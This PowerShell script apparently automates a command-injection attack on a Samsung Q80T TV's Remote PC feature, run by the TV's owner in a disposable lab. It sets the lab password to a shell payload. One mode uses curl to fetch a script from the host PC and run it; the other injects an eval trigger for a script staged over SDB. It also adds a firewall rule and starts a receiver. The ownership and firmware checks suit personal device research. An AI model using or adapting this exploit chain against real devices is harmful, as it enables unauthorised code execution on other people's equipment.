# Owner-operated bounded snapshot trial. Requires the existing disposable lab.
[CmdletBinding()]
param([Parameter(Mandatory=$true)][ValidateSet('Doctor','Prepare','PrepareStaged','Listen','ListenStaged','Restore')][string]$Action)
$ErrorActionPreference = 'Stop'
$root = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$lab = Join-Path $root '.local\tiz0wn-lab'
$envFile = Join-Path $lab 'lab.env'
$backup = Join-Path $lab 'lab.env.before-snapshot'
$sessionFile = Join-Path $lab 'snapshot-session.json'
$compose = Join-Path $PSScriptRoot 'lab\compose.yml'
$firewall = 'DansTVProbe-Temporary-Snapshot-HTTP'
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Run this command in Administrator PowerShell.'
}
$owner = Get-Content -LiteralPath (Join-Path $lab 'ownership.json') -Raw | ConvertFrom-Json
if ($owner.user -ne 'danstvprobe' -or $owner.share -ne 'DansTVProbe') {
    throw 'Unexpected lab ownership. Do not change unrelated Windows accounts or shares.'
}
foreach ($address in @($owner.pc, $owner.tv)) {
    $parsed = [Net.IPAddress]::Parse($address)
    if ($parsed.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork) { throw 'IPv4 lab required.' }
}
# Restoration must remain possible if the TV IP or firmware preflight has
# changed since Prepare. Those safeguards still apply to every new trial.
if ($Action -ne 'Restore') {
    $device = Get-Content -LiteralPath (Join-Path $root '.local\device.json') -Raw | ConvertFrom-Json
    $preflight = Get-Content -LiteralPath (Join-Path $root '.local\tiz0wn-preflight.json') -Raw | ConvertFrom-Json
    if ($owner.tv -ne $device.host -or
        $preflight.model_from_tv_menu -ne 'QA65Q80TAWXXY' -or
        $preflight.platform_version -ne '5.5' -or
        $preflight.cpu_arch -ne 'armv7' -or
        $preflight.firmware_confirmed -ne $true -or
        $preflight.firmware_from_current_tv_menu -ne 'T-NKMUABC-2743.0') {
        throw 'Lab target changed; review exact Q80T configuration before proceeding.'
    }
}
# Keep Compose interpolation separate from the password-bearing service env_file.
# A process-scoped host IP avoids passing literal ${IFS} in lab.env to the CLI.
function Assert-DockerReady {
    if (-not (Get-Command docker -ErrorAction SilentlyContinue)) {
        throw 'Docker CLI is missing; lab credentials unchanged.'
    }
    & docker info --format '{{.ServerVersion}}' 2>$null | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw 'Docker engine is not running. Start Docker Desktop before rotating lab credentials.'
    }
    & docker compose version | Out-Null
    if ($LASTEXITCODE -ne 0) { throw 'Docker Compose is unavailable; lab credentials unchanged.' }
}
function Invoke-LabCompose([string[]]$composeArgs) {
    $previousHostIP = [Environment]::GetEnvironmentVariable('LAB_HOST_IP', 'Process')
    try {
        $env:LAB_HOST_IP = [string]$owner.pc
        & docker compose -f $compose @composeArgs
        if ($LASTEXITCODE -ne 0) {
            throw ('Docker Compose ' + $composeArgs[0] + ' failed; review locally without sharing lab passwords.')
        }
    } finally {
        if ($null -eq $previousHostIP) {
            Remove-Item Env:LAB_HOST_IP -ErrorAction SilentlyContinue
        } else {
            $env:LAB_HOST_IP = $previousHostIP
        }
    }
}
# Owner-run, read-only Windows host preflight. Never contacts the television.
if ($Action -eq 'Doctor') {
    if (-not (Test-Path -LiteralPath $envFile -PathType Leaf)) {
        throw 'Missing private lab.env. Restore or recreate the disposable lab first.'
    }
    if ((Test-Path -LiteralPath $backup) -or (Test-Path -LiteralPath $sessionFile) -or
        (Test-Path -LiteralPath (Join-Path $lab 'lab.env.before-uid'))) {
        throw 'An earlier lab session is active. Restore and review it before preparing a new one.'
    }
    if (-not (Get-LocalUser -Name 'danstvprobe' -ErrorAction SilentlyContinue)) {
        throw 'Disposable local account danstvprobe is missing.'
    }
    if (-not (Get-SmbShare -Name 'DansTVProbe' -ErrorAction SilentlyContinue)) {
        throw 'Dedicated lab share DansTVProbe is missing.'
    }
    if (Get-NetTCPConnection -State Listen -LocalPort 8181 -ErrorAction SilentlyContinue) {
        throw 'Port 8181 is already listening; do not overlap diagnostic sessions.'
    }
    if (Get-NetFirewallRule -Name $firewall -ErrorAction SilentlyContinue) {
        throw 'An earlier snapshot callback firewall rule remains. Run Restore before starting a new trial.'
    }
    if (-not (Get-Command py -ErrorAction SilentlyContinue)) {
        throw 'Python launcher py is missing; install Python 3 before running the receiver.'
    }
    Assert-DockerReady
    Invoke-LabCompose -composeArgs @('config', '--quiet')
    foreach ($file in @('snapshot.sh', 'root-bridge.py', 'paste-password.py')) {
        if (-not (Test-Path -LiteralPath (Join-Path $PSScriptRoot $file) -PathType Leaf)) {
            throw ('Missing reviewed helper: ' + $file)
        }
    }
    Write-Output 'Q80T host diagnostic: passed model, firmware, owned lab, Python, Docker, share and free callback-port checks.'
    Write-Output 'No TV connection, account password changes, firewall rules or package operations were performed.'
    Write-Output 'For the newer short-password workflow, use -Action PrepareStaged only when at the TV. The old Prepare mode is blocked pending review.'
    return
}
function Password([string]$file) {
    $entries = @(Get-Content -LiteralPath $file | Where-Object { $_.StartsWith('TVPROBE_PASSWORD=') })
    if ($entries.Count -ne 1) { throw 'Expected one lab password.' }
    return $entries[0].Substring('TVPROBE_PASSWORD='.Length)
}
function Rotate([string]$password) {
    $null = Password $envFile
    # Before changing either Windows or XRDP credentials, ensure the engine
    # can accept the container recreate and safely resolve the Compose model.
    Assert-DockerReady
    Invoke-LabCompose -composeArgs @('config', '--quiet')
    $lines = @(Get-Content -LiteralPath $envFile | ForEach-Object {
        if ($_.StartsWith('TVPROBE_PASSWORD=')) { 'TVPROBE_PASSWORD=' + $password } else { $_ }
    })
    Set-LocalUser -Name 'danstvprobe' -Password (ConvertTo-SecureString $password -AsPlainText -Force)
    $lines | Set-Content -LiteralPath $envFile -Encoding ASCII
    Invoke-LabCompose -composeArgs @('up', '-d', '--force-recreate', '--no-build')
}
function Assert-XrdpListening {
    # Compose can return zero while the lab container remains Created; recover
    # only the dedicated lab container, then verify the actual host TCP port.
    $name = 'danstv-remote-pc-lab'
    for ($attempt = 0; $attempt -lt 20; $attempt++) {
        $status = ((& docker inspect --format '{{.State.Status}}' $name 2>$null) | Out-String).Trim()
        if ($status -eq 'created') {
            & docker start $name | Out-Null
            if ($LASTEXITCODE -ne 0) { throw 'Disposable XRDP container could not start.' }
        }
        if ($status -eq 'running') {
            $socket = New-Object Net.Sockets.TcpClient
            try {
                $pending = $socket.BeginConnect([string]$owner.pc, 3389, $null, $null)
                if ($pending.AsyncWaitHandle.WaitOne(650)) {
                    $socket.EndConnect($pending)
                    return
                }
            } catch {
                # TCP listener is not ready. Keep polling within the bounded window.
            } finally {
                $socket.Close()
            }
        }
        Start-Sleep -Milliseconds 350
    }
    throw 'XRDP container is not accepting TCP/3389; credentials will be restored.'
}

if ($Action -eq 'Restore') {
    # Revoke the network listener first; preserve backup until both credentials restore.
    $hadBackup = Test-Path -LiteralPath $backup
    $hadSession = Test-Path -LiteralPath $sessionFile
    Get-NetFirewallRule -Name $firewall -ErrorAction SilentlyContinue | Remove-NetFirewallRule
    if ($hadSession -and -not $hadBackup) {
        throw 'Snapshot session exists but the credential backup is missing. Network access was revoked; local password state is UNKNOWN. Preserve session details and recover the dedicated lab credentials manually.'
    }
    if ($hadBackup) {
        Rotate (Password $backup)
        Assert-XrdpListening
        Remove-Item -LiteralPath $backup
    }
    if ($hadSession) { Remove-Item -LiteralPath $sessionFile }
    if ($hadBackup) {
        Write-Output 'Snapshot access revoked and lab credentials restored. Update TV saved password from lab.env.'
    } else {
        Write-Output 'No snapshot credential backup found; callback firewall permission revoked.'
    }
    return
}
if ($Action -eq 'PrepareStaged') {
    # A safe SDB upload/readback test MUST pass before changing any lab credentials.
    & $PSCommandPath -Action Doctor | Out-Null
    $signingFile = Join-Path $root '.local\signing.json'
    if (-not (Test-Path -LiteralPath $signingFile)) { throw 'Missing private Samsung SDK configuration.' }
    $signing = Get-Content -LiteralPath $signingFile -Raw | ConvertFrom-Json
    $sdkDir = [string]$signing.sdk_path
    if (-not [IO.Path]::IsPathRooted($sdkDir)) { $sdkDir = Join-Path $root $sdkDir }
    $sdb = Join-Path $sdkDir 'tools\sdb.exe'
    if (-not (Test-Path -LiteralPath $sdb -PathType Leaf)) {
        throw 'SDB executable not found at the configured Samsung SDK path.'
    }
    $bytes = New-Object byte[] 12
    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
    try { $rng.GetBytes($bytes) } finally { $rng.Dispose() }
    $token = ([BitConverter]::ToString($bytes) -replace '-','').ToLowerInvariant()
    $stageRemote = '/home/owner/share/tmp/sdk_tools/dtvs' + $token.Substring(0,8) + '.sh'
    $stageLocal = Join-Path $lab ('stage-' + $token + '.sh')
    $stageVerified = Join-Path $lab ('stage-verified-' + $token + '.sh')
    $report = Join-Path $lab ('snapshot-' + $token + '.txt')
    try {
        & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') --host $owner.pc --tv $owner.tv --token $token --output $report --write-stage $stageLocal --stage-remote $stageRemote | Out-Null
        if ($LASTEXITCODE -ne 0) { throw 'Unable to prepare the fixed survey in the private lab.' }
        $serial = ([string]$owner.tv) + ':26101'
        & $sdb connect $serial | Out-Null
        if ($LASTEXITCODE -ne 0) { throw 'SDB connection to Q80T failed; no credentials changed.' }
        $state = ((& $sdb -s $serial get-state 2>&1) | Out-String).Trim()
        if ($LASTEXITCODE -ne 0 -or $state -ne 'device') {
            throw 'Q80T SDB transport is not ready; no credentials changed.'
        }
        & $sdb -s $serial push $stageLocal $stageRemote | Out-Null
        if ($LASTEXITCODE -ne 0) { throw 'TV refused the SDB survey staging path; no credentials changed.' }
        & $sdb -s $serial pull $stageRemote $stageVerified | Out-Null
        if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $stageVerified)) {
            throw 'TV SDB pull/readback unavailable; no credentials changed. Do not continue with an unverified staged file.'
        }
        $expected = (Get-FileHash -LiteralPath $stageLocal -Algorithm SHA256).Hash
        $actual = (Get-FileHash -LiteralPath $stageVerified -Algorithm SHA256).Hash
        if ($expected -cne $actual) {
            throw 'SDB staged script hash differs from the original; no credentials changed.'
        }
    } finally {
        if (Test-Path -LiteralPath $stageVerified) {
            Remove-Item -LiteralPath $stageVerified -Force
        }
    }

    # The password carries only a short fixed-script invocation, never the
    # survey body, URL, network address or a long combined shell expression.
    $probe = '$(eval${IFS}$(cat${IFS}' + $stageRemote + '))'
    if ($probe.Length -gt 90) { throw 'Short diagnostic trigger unexpectedly long.' }
    Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
    try {
        [ordered]@{
            token=$token; host=$owner.pc; tv=$owner.tv; output=$report;
            mode='Staged'; stage_remote=$stageRemote
        } | ConvertTo-Json | Set-Content -LiteralPath $sessionFile -Encoding ASCII
        Rotate $probe
        Assert-XrdpListening
        New-NetFirewallRule -Name $firewall -DisplayName 'DansTV temporary staged snapshot callback' -Direction Inbound -Action Allow -Protocol TCP -LocalAddress $owner.pc -LocalPort 8181 -RemoteAddress $owner.tv -Profile Any | Out-Null
    } catch {
        Write-Warning 'Staged preparation failed; restoring the dedicated lab credentials.'
        try { & $PSCommandPath -Action Restore } catch {
            Write-Warning 'Automatic credential recovery failed; original backup is preserved. Run -Action Restore.'
        }
        throw
    }
    Write-Output 'STAGED-READY: TV script readback verified; XRDP TCP listener ready.'
    Write-Output 'Temporary TV Remote PC password (do not share it or lab.env):'
    Write-Output $probe
    Write-Output 'Next: run root-bridge.ps1 -Action ListenStaged, then open Remote PC and Shared Folder once.'
    return
}

if ($Action -eq 'Prepare') {
    if ((Test-Path $backup) -or (Test-Path $sessionFile) -or (Test-Path (Join-Path $lab 'lab.env.before-uid'))) {
        throw 'An earlier trial is active. Restore it before preparing a new one.'
    }
    if ((Get-NetFirewallRule -Name $firewall -ErrorAction SilentlyContinue) -or (Get-NetTCPConnection -State Listen -LocalPort 8181 -ErrorAction SilentlyContinue)) {
        throw 'Callback port or firewall rule already active.'
    }
    Assert-DockerReady
    Invoke-LabCompose -composeArgs @('config', '--quiet')
    $bytes = New-Object byte[] 12
    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
    try { $rng.GetBytes($bytes) } finally { $rng.Dispose() }
    $token = ([BitConverter]::ToString($bytes) -replace '-','').ToLowerInvariant()
    $tmp = '/tmp/dtv' + $token.Substring(0,6)
    $probe = '$(/usr/bin/curl${IFS}-fsS${IFS}http://' + $owner.pc + ':8181/d/' + $token + '>' + $tmp + '&&.${IFS}' + $tmp + ')'
    if ($probe.Length -gt 160) { throw 'Trigger exceeds measured TV input limit.' }
    Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
    try {
        [ordered]@{token=$token; host=$owner.pc; tv=$owner.tv; output=(Join-Path $lab ('snapshot-' + $token + '.txt'))} |
            ConvertTo-Json | Set-Content -LiteralPath $sessionFile -Encoding ASCII
        Rotate $probe
        New-NetFirewallRule -Name $firewall -DisplayName 'DansTV temporary snapshot callback' -Direction Inbound -Action Allow -Protocol TCP -LocalAddress $owner.pc -LocalPort 8181 -RemoteAddress $owner.tv -Profile Any | Out-Null
    } catch {
        Write-Warning 'Prepare incomplete. Run root-bridge.ps1 -Action Restore before retrying.'
        throw
    }
    Write-Output 'XRDP restarted. Private trial password is in .local/tiz0wn-lab/lab.env; do not share it.'
    Write-Output 'Next run root-bridge.ps1 -Action Listen in this elevated window.'
    return
}
if (-not (Test-Path $backup)) { throw 'Prepare the snapshot trial first.' }
$session = Get-Content -LiteralPath $sessionFile -Raw | ConvertFrom-Json
if ($Action -eq 'Listen' -and $session.mode -eq 'Staged') {
    throw 'This is a staged session. Use -Action ListenStaged.'
}
if ($Action -eq 'ListenStaged' -and $session.mode -ne 'Staged') {
    throw 'This is not a staged session. Use -Action Listen.'
}
if ($session.host -ne $owner.pc -or $session.tv -ne $owner.tv -or $session.token -notmatch '^[0-9a-f]{24}$') {
    throw 'Invalid snapshot session.'
}
try {
    $argsForReceiver = @('--host', [string]$session.host, '--tv', [string]$session.tv, '--token', [string]$session.token, '--output', [string]$session.output)
    if ($Action -eq 'ListenStaged') { $argsForReceiver += '--staged' }
    & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') @argsForReceiver
    if ($LASTEXITCODE -ne 0) { throw 'No validated snapshot received.' }
    & py -3 (Join-Path $PSScriptRoot 'assess-snapshot.py') --report $session.output
    if ($LASTEXITCODE -ne 0) { throw 'Snapshot saved but assessment did not pass.' }
} finally {
    # Listener is synchronous and has exited. Credentials remain recoverable on failure.
    & $PSCommandPath -Action Restore
}
